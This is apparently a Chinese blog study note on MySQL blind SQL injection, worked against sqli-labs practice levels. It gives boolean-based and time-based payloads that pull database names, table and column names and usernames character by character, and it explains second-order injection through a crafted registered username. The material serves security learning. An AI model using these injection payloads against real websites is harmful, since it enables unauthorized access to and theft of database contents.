# 07-mysql盲注




# SQL测试-基于 布尔,延时 盲注

>场景：无回显，并且没有报错和其他显示
>能用布尔就不用延迟

**几个相关函数：**
`regexp`       regexp '^xiaodi[a-z]' 匹配xiaodi及xiaodi...等
`if`       if(条件,5,0) 条件成立 返回5 反之 返回0
`sleep`    sleep(5) SQL语句延时执行5秒
`mid`    mid(a,b,c)从位置 b 开始， 截取 a 字符串的 c 位
`substr`   substr(a,b,c)从 b 位置开始， 截取字符串 a 的 c 长度
`left`    left(database(),1)，database()显示数据库名称， left(a,b)从左侧截取 a 的前 b 位
`length`    length(database())=8，判断数据库database()名的长度
`ord`=`ascii`     ascii(x)=101，判断x的ascii码是否等于101，即email中的字母e
`IFNULL()`  函数用于判断第一个表达式是否为 NULL，如果为 NULL 则返回第二个参数的值，如果不为 NULL 则返回第一个参数的值。
`CAST()`和`CONVERT()`函数可用来获取一个类型的值，并产生另一个类型的值。两者具体的语法如下：`CAST(value as type);`        `CONVERT(value, type);`

#### 基于布尔(逻辑)盲注

Less-5
用burp批量跑
**0x01 获取`数据库`名操作Payload：**     left()
获取数据库名长度值
`?id=1' and length(database())=8 %23`

获取数据库名第一位值
`?id=1' and left(database(),1)='s' %23`     等于
`?id=1' and left(database(),1)>'a' %23`     大于

获取数据库名第二位值
`?id=1' and left(database(),2) > 'sa' %23`
`?id=1' and left(database(),2) = 'se' %23`



**0x02 获取`表名`操作Payload：**     ascii(substr())
获取表名第一个第一位的值（下面这个是获取表名中第一个表，的第二位的值）
`?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 %23`
获取表名第一个第二位的值
`?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=101 %23`
获取表名第二个第一位的值
`?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=101 %23`

用burp批量跑(最后一种模式，设置两个变量  limit $0, 1), $1,1))=115)   



**0x03 获取`列名`操作Payload：**    regxp
获取列名regexp 查询users表第一个列名是否有us...列名
`?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '^us[a-z]' limit 0,1)--+`



**0x04 获取`数据`操作Payload：**    ord(mid())
获取数据 security.users表中username列名的第一个第一位
`?id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+`
(获取username中的第一行的第一个字符的ascii，与68进行比较)




#### 基于延时盲注

**0x01 获取数据库名操作Payload：**     if(条件，成立返回值，不成立的返回值)
获取数据库名第一个第一位
`?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),1)--+`
可以把sleep放外面：and sleep(if 'x'='yx, 5, 0)

**0x02 获取表名操作Payload：**
获取列名第一个第一位
`?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100,sleep(5),1)--+`

>后续参考：https://www.cnblogs.com/xishaonian/p/6113965.html

-----



## SQL二次注入测试

**案例测试**：
less-24 及实际举例
25-30关卡好多是二次注入

> 自己练习

**应用范围：**
我们注册一个用户后，然后进入用户中心，对应的url地址： xxx.php?user=xiaodi
如果把注册的用户名改为: `xx' union select 1,2,3 -- `  
总之: 将注入语句让web写入到数据库中，web在调用数据库中数据查询时，就触发了...



###### 原理

<img src="http://image.geoer.cn/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5.png"></img>



#### mybatis以及预编译如何防止SQL注入


>参考：https://www.cnblogs.com/haojun/p/10682407.html https://www.cnblogs.com/yangzailu/p/11381765.html

---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/07-mysql%E7%9B%B2%E6%B3%A8/  

